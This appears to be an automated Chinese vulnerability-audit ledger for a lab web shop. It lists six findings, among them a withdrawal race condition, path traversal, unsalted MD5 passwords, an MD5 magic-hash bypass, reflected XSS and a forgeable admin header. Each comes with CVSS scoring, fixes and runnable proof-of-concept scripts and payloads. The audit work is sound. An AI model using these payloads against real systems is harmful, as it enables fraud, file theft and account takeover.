  结论：withdraw.php 第4行单独 SELECT balance，第5行做余额充足判断，第6行 usleep(350000) 人为放大时间窗，第7行用 UPDATE users SET balance=<旧余额-amount> 直接覆盖写回。写回使用先前读到的快照值而非 balance=balance-? 的原子条件更新，也没有事务/行锁/幂等键，因此同一用户多个并发提现请求都能通过余额校验并各自写回相同旧余额减各自 amount，最终 users.balance 只反映一次扣减，而 withdrawals 表记录了全部提现，账户被透支。攻击者只需合法会话与钱包页输出的 CSRF token 即可并发重放。
  输入：POST /wallet/withdraw.php 的 amount 参数（攻击者可控），配合并发发送多次相同请求
  传播：amount 经 filter_var 校验（>0 且 <=10000）→ 第4行读取 balance → 第5行比较 → 第6行 sleep 350ms → 第7行以旧 balance-amount 覆盖写 → 第8行插入 withdrawals 记录
  危险操作：非原子读-改-写余额：UPDATE users SET balance=? WHERE id=? 使用过期的余额快照覆盖，且无事务/锁/条件更新
  保护：第2行仅做金额范围校验（>0、<=10000）与 CSRF 校验；第3行 session_write_close() 主动释放会话锁，反而消除了并发串行化；无 SELECT ... FOR UPDATE、无事务、无 WHERE balance>=amount 条件更新
  前提：['任意有效登录会话（注册即得，初始余额 100）；持有会话对应的 CSRF token（钱包页面直接输出）；并发发起多个提现请求']
  修复建议：改为原子条件更新：UPDATE users SET balance=balance-? WHERE id=? AND balance>=?，并据 rowCount 决定是否插入 withdrawal；或将 SELECT ... FOR UPDATE 与写回放入同一事务，增加幂等请求键，移除 usleep。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:50:36.815581+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP 接口远程利用 | lab30-shop/app/public/wallet/withdraw.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | H | 依赖在 350ms 窗口内精确并发的时序 | lab30-shop/app/public/wallet/withdraw.php:4-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需注册得到的普通用户会话 | lab30-shop/app/src/bootstrap.php:33-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 在攻击者自身会话内完成，无需他人参与 | lab30-shop/app/public/wallet/withdraw.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响限于本账户资金记录 | lab30-shop/app/public/wallet/withdraw.php:7-8 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 不泄露他人数据 | lab30-shop/app/public/wallet/withdraw.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可篡改自身余额并生成超出余额的提现流水，单次上限 10000 且可并发放大 | lab30-shop/app/public/wallet/withdraw.php:7-8 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 不影响服务可用性 | lab30-shop/app/public/wallet/withdraw.php:6-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'withdraw_race.sh', 'language': 'bash', 'script': '#!/bin/bash\nBASE=http://TARGET\nCOOKIE=/tmp/c.txt\ncurl -s -c $COOKIE -b $COOKIE -d "username=victim&password=password123" $BASE/auth/login.php >/dev/null\nCSRF=$(curl -s -c $COOKIE -b $COOKIE $BASE/wallet/index.php | grep -o \'name="csrf" value="[^"]*"\' | sed \'s/.*value="//;s/"//\')\nfor i in $(seq 1 10); do curl -s -b $COOKIE -d "amount=100&csrf=$CSRF" $BASE/wallet/withdraw.php -H \'Accept: application/json\' & done; wait\ncurl -s -b $COOKIE -H \'Accept: application/json\' $BASE/wallet/index.php', 'instructions': '替换 BASE 为目标地址与受害账号口令；登录后从钱包页取得 csrf，然后并发 10 个提现 100 的请求（余额初始 100），最后请求 /wallet/index.php 并带 Accept: application/json 查看 balance 与 withdrawn_total。', 'normal_input': '单次 POST amount=100 且 csrf 正确', 'attack_input': '并发 10 次 POST amount=100（同一会话同一 csrf）', 'expected_result': '正常单次后 balance=0、withdrawn_total=100；并发攻击后 withdrawals 累计约 1000 而 balance 仅扣一次或为负，表明余额被透支'}
````


### 台账 `a22f218afa874a998573023f0988a503`

- support/download.php 将 GET file 直接拼接 docs 目录后 file_get_contents，导致路径遍历任意文件读取（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `aca84b4e3ffd4938b310c1568e2915bb` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/support/download.php', 'start_line': 1, 'end_line': 4}, {'path': 'lab30-shop/app/src/setup.php', 'start_line': 30, 'end_line': 39}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 9, 'end_line': 9}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：download.php:3 取 $_GET['file']，仅做 (string) 转换后拼接 data_dir().'/docs/'，再 is_file 判断后 file_get_contents 并原样输出。未使用 basename、realpath 前缀校验或文件名白名单，'../' 序列可穿越 docs 目录。setup.php:30-35 在同一 data_dir 根下创建 vault/internal.txt（含内部标记）与 vault/account.php，另有 sessions 目录，因此攻击者可读取任意可读文件，文件不存在时返回 404 可用于探测。bootstrap.php:9 data_dir 由 SHOP_DATA_DIR 决定，默认 /var/lib/shop。
  输入：HTTP GET 参数 file（攻击者完全可控），入口 /support/download.php
  传播：$_GET['file'] -> $path = data_dir().'/docs/'.$_GET['file'] -> is_file($path) -> file_get_contents($path) -> echo 输出（text/plain）
  危险操作：file_get_contents($path) 读取任意路径内容并回显给攻击者
  保护：仅 require_user() 登录校验与 is_file() 存在性判断；无 basename、realpath/str_starts_with 前缀校验、无扩展名或名称白名单
  前提：['任意已登录用户（注册即可获得会话）；无需特权角色']
  修复建议：只接受白名单文件名并拼接到固定目录；对拼接结果做 realpath 并与 data_dir().'/docs' 前缀比较，拒绝包含 ../ 或绝对路径的输入；避免把内部敏感文件放在 Web 可读数据根下。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:51:26.765400+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 Web 入口 /support/download.php 远程访问 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需在 file 参数写 ../ 序列即可穿越，无需特殊条件 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 第 2 行 require_user() 要求登录，注册即可获得普通账号 | lab30-shop/app/public/support/download.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/bootstrap.php:33-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自己发起请求，无需他人交互 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 在同一应用沙箱内读取文件，未跨越授权边界 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读取 data_dir 下 vault/internal.txt、vault/account.php、sessions 等敏感文件内容 | lab30-shop/app/src/setup.php:30-38 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 仅读取，无写入或修改操作 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 不影响可用性 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'download_traversal_poc.sh', 'language': 'bash', 'script': '#!/bin/sh\nBASE="${1:-http://localhost:8080}"\nCOOKIE="${2:-/tmp/cookies.txt}"\n# 登录后可复用已有 cookie：\n# curl -c "$COOKIE" -b "$COOKIE" -d \'username=alice&password=alice123\' "$BASE/auth/login.php"\ncurl -s -b "$COOKIE" "$BASE/support/download.php?file=shipping.txt"\necho \'--- traversal ---\'\ncurl -s -b "$COOKIE" --path-as-is "$BASE/support/download.php?file=../vault/internal.txt"\n', 'instructions': '以已登录普通用户 cookie 访问目标 /support/download.php；先请求 file=shipping.txt 作为对照，再用 --path-as-is 发送 file=../vault/internal.txt 读取内部标记文件；如路径被规范化可尝试 ../vault/account.php 或 %2e%2e/ 编码。', 'normal_input': 'file=shipping.txt', 'attack_input': 'file=../vault/internal.txt', 'expected_result': '对照请求返回“配送说明”文本；攻击请求返回 SHOP_INTERNAL_ 开头的内部标记内容（或 account.php 源码），证明越出 docs 目录读取。'}
````


### 台账 `a519628c7ceb4b939b2da20d4a95dba7`

- support/download.php 的 GET file 未校验，可 ../ 穿越读取 data_dir 下任意文件（含 vault/internal.txt）（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `0571345e2eb6491294d28e938cf0e027` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/support/download.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 9, 'end_line': 9}, {'path': 'lab30-shop/app/src/setup.php', 'start_line': 30, 'end_line': 38}]
  结论：download.php:3 将 $_GET['file'] 直接拼接在 data_dir().'/docs/' 后并 file_get_contents 输出，无 basename/realpath 前缀校验；data_dir 默认 /var/lib/shop 下 vault/internal.txt 与 vault/account.php 存随机内部标记（setup.php:25-35），file=../vault/internal.txt 即可越出 docs 目录读取。
  输入：HTTP GET 参数 file
  传播：$_GET['file'] -> data_dir().'/docs/'.file -> is_file -> file_get_contents 输出
  危险操作：file_get_contents 读取拼接后的宿主文件路径并回显
  保护：仅 is_file 存在性与登录要求，缺少路径规范化与白名单
  前提：['任意已登录账号访问 /support/download.php?file=../vault/internal.txt']
  修复建议：用 basename() 并对 realpath 结果校验位于 data_dir().'/docs/' 前缀内，或改用固定文档名白名单映射。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:51:54.307645+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP GET 触发 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需在 file 参数加 ../ | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user() 仅要求任意登录账号，注册即可获得 | lab30-shop/app/public/support/download.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自行发起请求 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响限于宿主文件读取 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读任意可读文件，包括 vault 中随机内部标记 | lab30-shop/app/src/setup.php:34-35 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 只读 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无破坏 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'traversal_download.sh', 'language': 'bash', 'script': "curl -s -b cookies.txt 'http://TARGET/support/download.php?file=../vault/internal.txt'", 'instructions': '先登录拿 SHOPSESSID 写入 cookies.txt，再请求该 URL', 'normal_input': 'file=shipping.txt', 'attack_input': 'file=../vault/internal.txt', 'expected_result': '正常返回配送说明；攻击返回以 SHOP_INTERNAL_ 开头的内部标记'}
````


### 台账 `527d01def9cc47ad87f8bdfc2422f2ba`

- 用户密码以无盐 MD5 存储与比较（register/login/setup），登录后亦不 session_regenerate_id（CVSS 3.1 Base 7.4 (high) · CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N，验证：unverified）
  来源 `e87a7dc17f284d5ba5954d482712f629` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/auth/register.php', 'start_line': 7, 'end_line': 8}, {'path': 'lab30-shop/app/public/auth/login.php', 'start_line': 3, 'end_line': 9}, {'path': 'lab30-shop/app/src/setup.php', 'start_line': 17, 'end_line': 17}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 11, 'end_line': 19}]
  结论：register.php 用 md5($password) 入库 password_md5（第 8 行），login.php 以 hash_equals($row['password_md5'], md5($_POST['password'])) 比较（第 7 行），setup.php 第 17 行同样以 md5 写入种子账号口令；全项目无 password_hash/password_verify 调用，也无每用户盐值，属于快速无盐哈希，泄露哈希即可离线还原明文。此外登录成功写入 $_SESSION['user_id'] 后未调用 session_regenerate_id（全仓无该调用），会话标识沿用 __Host 前置绑定，与 bootstrap.php 第 13 行 use_strict_mode=0 及 login.php 第 3 行接受 GET sid 共同放大会话固定风险。
  输入：攻击者获取的 password_md5 哈希（数据库泄露、备份或 SQL 注入读取）；注册时提交的 password
  传播：register.php:8 md5($password) -> users.password_md5；login.php:7 以同一 md5 比较 -> 第 8 行写入 $_SESSION['user_id']（无 session_regenerate_id）
  危险操作：使用无盐 MD5 作为口令派生与验证函数，且认证成功后不轮换会话标识
  保护：仅在登录时使用 hash_equals 防止时序侧信道；未使用 password_hash/password_verify，无盐值、无慢哈希成本参数
  前提：['需要获得 password_md5 值（如数据库或备份泄露）；对会话固定部分需要诱导受害者在带 sid 的链接中登录']
  修复建议：改用 password_hash($password, PASSWORD_DEFAULT) 存储、password_verify 校验；登录成功后调用 session_regenerate_id(true) 轮换会话 ID，并关闭 use_strict_mode=0、不从 GET 接受 sid；对既有 md5 记录做登录时透明升级。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:53:57.206000+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 注册/登录接口可通过网络访问 | lab30-shop/app/public/auth/register.php:4-8 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | H | 需先取得 password_md5 哈希值（如数据库泄露）才能离线破解，攻击链较长 | lab30-shop/app/src/setup.php:17-17 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 注册与登录均无需认证 | lab30-shop/app/public/auth/register.php:1-8 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 破解离线进行，无需受害者交互 | lab30-shop/app/public/auth/login.php:6-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仅影响用户凭据机密性 | lab30-shop/app/public/auth/login.php:7-8 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 无盐快速 MD5 可被彩虹表/GPU 秒破，泄露即可还原明文口令并接管账号 | lab30-shop/app/public/auth/register.php:8-8 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 取得口令后可以该用户身份登录并执行其全部操作（订单、钱包、ops 等） | lab30-shop/app/public/auth/login.php:7-9 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无直接可用性影响证据 | lab30-shop/app/public/auth/login.php:1-13 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'weak_md5_hash_check.php', 'language': 'php', 'script': '<?php\n// 验证离线破解：注册接口写入的就是无盐 md5\n$leaked = md5(\'Password123\'); // 对应 lab30-shop 中 password_md5 存储形式\n$candidates = [\'123456\',\'password\',\'Password123\'];\nforeach ($candidates as $c) {\n    if (md5($c) === $leaked) { echo "cracked: $c\\n"; }\n}\n', 'instructions': "1) 对 /auth/register.php 提交 username=demo1&password=Password123 创建账号；2) 从数据库 users 表读取该行 password_md5，确认等于 md5('Password123')（无盐、32 位十六进制）；3) 运行脚本演示候选字典瞬间命中，说明非慢哈希、可直接还原明文。", 'normal_input': 'username=demo1&password=Password123（首次注册）', 'attack_input': "读取到的 password_md5 = md5('Password123')，用离线字典比对命中", 'expected_result': 'password_md5 与单次无盐 MD5 完全一致且可被离线字典在毫秒级还原，而推荐实现（password_hash 的 bcrypt/argon2）会带随机盐且每次不同'}
````


### 台账 `e0cf553e9838411fa31a2455b8d0dd8d`

- account/redeem.php 用 == 弱比较 md5，魔术哈希绕过兑换码校验并提权为金卡会员（CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N，验证：unverified）
  来源 `6f325173cd054b03bf05640d00e691fa` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/redeem.php', 'start_line': 4, 'end_line': 6}, {'path': 'lab30-shop/app/src/backup.php', 'start_line': 3, 'end_line': 4}, {'path': 'lab30-shop/app/public/account/index.php', 'start_line': 3, 'end_line': 3}]
  结论：redeem.php 第 4 行以 md5('240610708') 作为固定密钥哈希，第 5 行用非严格 == 比较 md5(token) 与该哈希。PHP 中两个形如 '0e...' 的纯数字字符串在 == 下按数值比较，md5('240610708')='0e462097431906509019562988736854'，攻击者提交 240610708（或 QNKCDZO 等已知 0e 前缀输入）时 md5 结果同样为 0e 开头，比较为真，无需知道兑换码即可执行 UPDATE users SET tier='gold' 将自己升级为金卡会员。
  输入：POST 参数 token（表单字段，来自 redeem.php 表单）
  传播：check_csrf() 通过后 $_POST['token'] -> md5((string)$token) -> 与 $secret_hash 弱比较 == -> 真分支 UPDATE users SET tier='gold' WHERE id=$u['id']
  危险操作：db()->prepare("UPDATE users SET tier='gold' WHERE id=?")->execute([$u['id']]) 提升会员等级
  保护：仅 CSRF 校验与 require_user 登录校验，没有任何高强度令牌或严格比较；兑换码哈希使用 md5 且比较为 ==，较弱。
  前提：['攻击者持有有效登录会话与页面 CSRF token（注册即得），POST token=240610708 即可；无需知道真实兑换码。']
  修复建议：兑换码不要依赖 md5 与 ==；使用 hash_equals() 做恒定时间严格比较，令牌应为高熵随机值并以 password_hash 存储，且提示不使用 md5。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:54:24.056856+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP 表单远程触发 | lab30-shop/app/public/account/redeem.php:3-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 使用已公开的 md5 0e 前缀输入即可稳定命中 | lab30-shop/app/public/account/redeem.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需普通注册用户登录会话与 CSRF token | lab30-shop/app/public/account/redeem.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身操作即可，无需他人参与 | lab30-shop/app/public/account/redeem.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仅改变自身账户的会员等级字段 | lab30-shop/app/public/account/redeem.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 未读取未授权数据 | lab30-shop/app/public/account/redeem.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 篡改自身 tier 为 gold，绕过付费/兑换限制 | lab30-shop/app/public/account/redeem.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 不影响可用性 | lab30-shop/app/public/account/redeem.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'redeem_weak_compare.py', 'language': 'python', 'script': "import urllib.request, urllib.parse\nBASE='http://TARGET'\ncookie='SHOPSESSID=REPLACE'\ncsrf='REPLACE'\ndata=urllib.parse.urlencode({'csrf':csrf,'token':'240610708'}).encode()\nreq=urllib.request.Request(BASE+'/account/redeem.php',data=data,headers={'Cookie':cookie,'Content-Type':'application/x-www-form-urlencoded','Accept':'application/json'})\nprint(urllib.request.urlopen(req).read().decode())\nreq2=urllib.request.Request(BASE+'/account/me.php',headers={'Cookie':cookie,'Accept':'application/json'})\nprint(urllib.request.urlopen(req2).read().decode())\n", 'instructions': '1) 用测试账号登录并 GET /account/redeem.php 提取 csrf 与 Cookie；2) 将占位符替换为实际值；3) 运行脚本，POST token=240610708；4) 再访问 /account/index.php 或 /account/me.php 查看 tier。', 'normal_input': 'token=randomwrongvalue', 'attack_input': 'token=240610708', 'expected_result': '正常输入返回 422 accepted=false；攻击输入返回 200 accepted=true，随后 /account/me.php 显示 tier=gold'}
````


### 台账 `85e0c4fd0de74f398345de4b20b42898`

- account/profile.php 将 $_GET['url'] 未转义拼入 href，造成反射型 XSS 及开放重定向（CVSS 3.1 待评分，验证：unverified）
  来源 `31368fadabc74635aafae28a2b56d52b` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/profile.php', 'start_line': 2, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 10, 'end_line': 10}, {'path': 'lab30-shop/app/public/account/update.php', 'start_line': 4, 'end_line': 6}]
  结论：profile.php:2 从 $_GET['url'] 取用户输入（缺省回退到 $u['homepage']），第3行通过字符串拼接 '<a id="profile-link" href="'.$url.'">' 输出到 HTML 属性中，未调用 h() 转义、未校验协议/域名。攻击者可构造 url 参数闭合双引号并注入事件属性（如 " onmouseover=alert(1) x="）实现反射型 XSS；也可注入 javascript: 伪协议；配合 update.php 可将恶意 homepage 持久保存用于二次反射。
  输入：GET 参数 url
  传播：$_GET['url'] -> $url -> 字符串拼接进 href 属性 -> 响应 HTML
  危险操作：未转义输出到 HTML 属性上下文（DOM/HTML 注入）
  保护：bootstrap.php 定义 h() 使用 htmlspecialchars，但 profile.php:3 未对 $url 调用 h()，也没有协议白名单或 filter_var 校验；仅页面其他字段使用 h()。
  前提：['攻击者需持有有效登录会话（注册即可）访问 /account/profile.php?url=...；受害者点击该链接即触发，无需其他交互（事件属性取决于浏览器）。']
  修复建议：使用 h($url) 输出到属性，并对 URL 采用 filter_var(FILTER_VALIDATE_URL) 与协议白名单（仅 http/https），必要时强制 rel="noopener noreferrer"。

**CVSS 3.1 评分依据**

- 状态：待补充指标；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:55:23.308369+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过浏览器访问 HTTP 链接触发 | lab30-shop/app/public/account/profile.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需构造 url 参数即可稳定注入 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 页面先 require_user()，需登录会话（注册即得） | lab30-shop/app/public/account/profile.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 受害者需打开恶意链接 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | C | 脚本在同源页面上下文执行，可读取会话相关敏感响应 | lab30-shop/app/public/account/me.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 同源脚本可读取页面上下文数据 | lab30-shop/app/public/account/me.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可代表受害者发起状态变更请求 | lab30-shop/app/public/account/update.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | 待补充 | 无服务可用性影响依据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'profile_xss_poc.txt', 'language': 'text', 'script': 'GET /account/profile.php?url=%22%20onmouseover%3Dalert(document.domain)%20x%3D%22 HTTP/1.1\nHost: target\nCookie: SHOPSESSID=<valid session>\n\n# 或 javascript: 伪协议\nGET /account/profile.php?url=javascript:alert(document.cookie) HTTP/1.1\nHost: target\nCookie: SHOPSESSID=<valid session>', 'instructions': '先注册/登录取得 SHOPSESSID，访问上述 URL；页面会输出 <a id="profile-link" href="" onmouseover=alert(...) x="">。', 'normal_input': 'url=https://example.com', 'attack_input': 'url=" onmouseover=alert(1) x="', 'expected_result': '正常输入渲染为纯 href 链接；攻击输入在属性中注入事件处理器，浏览器渲染/交互时执行脚本。'}
````


### 台账 `358642a27fa34b7fb53710ee9710078f`

- ops/maintenance.php 仅凭可伪造 X-Admin:1 请求头通过服务身份校验并非授权写入 jobs 表（CVSS 3.1 Base 5.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N，验证：unverified）
  来源 `585b4800c49d4e54b1e49860a978e603` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/maintenance.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：maintenance.php:2 仅加载 bootstrap，无 require_user 登录要求；第3行判断 ($_SERVER['HTTP_X_ADMIN'] ?? '')!=='1' 即拦截，攻击者发送任意 HTTP 请求头 X-Admin: 1 即通过。第4行在 POST 时执行 INSERT INTO jobs(user_id,title,status,details) VALUES(4,?,'queued','维护接口发起') 并把 job_id 返回，形成未认证的服务端数据写入。服务身份完全由客户端可伪造的请求头决定。
  输入：HTTP 请求头 X-Admin
  传播：maintenance.php:3 比较 HTTP_X_ADMIN 头等于 '1' 通过 → maintenance.php:4 以 user_id=4 写入 jobs 表并回显 lastInsertId
  危险操作：以伪造服务身份向 jobs 表插入作业记录
  保护：服务身份仅由请求头判定，请求头可由任意客户端自由设置；页面未调用 require_user 或会话校验
  前提：['可直接访问 /ops/maintenance.php 并发送 POST 请求，请求头 X-Admin: 1']
  修复建议：以服务端会话角色或不可伪造的共享密钥/网络边界校验服务身份，移除对 HTTP_X_ADMIN 头的信任，并对写操作加鉴权与 CSRF 保护。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:57:26.158136+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 经 HTTP 远程访问 | lab30-shop/app/public/ops/maintenance.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需设置一个请求头 | lab30-shop/app/public/ops/maintenance.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 无需登录 | lab30-shop/app/public/ops/maintenance.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无其他用户参与 | lab30-shop/app/public/ops/maintenance.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一应用授权边界内绕过 | lab30-shop/app/public/ops/maintenance.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 仅回显 job_id | lab30-shop/app/public/ops/maintenance.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 非授权写入一条作业记录 | lab30-shop/app/public/ops/maintenance.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响证据 | lab30-shop/app/public/ops/maintenance.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'poc_maintenance_header.sh', 'language': 'bash', 'script': "curl -s -X POST -H 'X-Admin: 1' 'http://target/ops/maintenance.php'", 'instructions': '无需会话，直接向 /ops/maintenance.php 发送带 X-Admin: 1 头的 POST 请求。', 'normal_input': '不带 X-Admin 头', 'attack_input': 'X-Admin: 1', 'expected_result': '无头返回 403；带头返回 JSON accepted=true 及新 job_id'}
````


## 覆盖与未决方向

